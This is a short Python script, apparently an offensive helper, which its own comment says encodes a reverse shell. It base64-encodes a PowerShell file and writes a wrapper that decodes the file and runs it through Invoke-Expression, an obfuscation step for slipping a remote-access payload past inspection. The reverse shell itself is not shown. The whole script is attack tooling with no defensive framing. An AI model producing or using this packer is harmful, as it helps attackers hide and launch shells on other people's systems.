import base64

# base64 encoded reverse shell
with open('./powershell.ps1', 'rb') as f:
    encoded_bytes = base64.b64encode(f.read())
    encoded_string = encoded_bytes.decode('utf-8')

with open("./powershell.enc.ps1", 'w') as f:

    payload = '''Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REPLACE_ME"))) '''
    payload=payload.replace("REPLACE_ME", encoded_string)

    f.write(payload)